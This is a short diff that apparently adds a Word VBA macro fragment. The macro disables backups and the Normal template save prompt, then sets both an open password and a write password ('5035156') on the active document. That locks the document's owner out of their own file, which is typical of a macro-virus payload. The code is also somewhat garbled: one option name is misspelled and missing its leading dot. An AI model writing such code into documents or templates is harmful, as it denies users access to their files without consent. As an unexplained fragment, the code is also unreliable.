@@ -1,0 +1,16 @@
+With Options
+AllowFastSave = True
+BackgroundSave = True
+creatbackup = False
+SavePropertiesPrompt = False
+SaveInterval = 10
+.SaveNormalPrompt = False
+End With
+With ActiveDocument
+.ReadOnlyRecommended = False
+.SaveFormsData = False
+.SaveSubsetFonts = False
+.Password = "5035156"
+.WritePassword = "5035156"
+End With
+Application.DefaultSaveFormat = ""
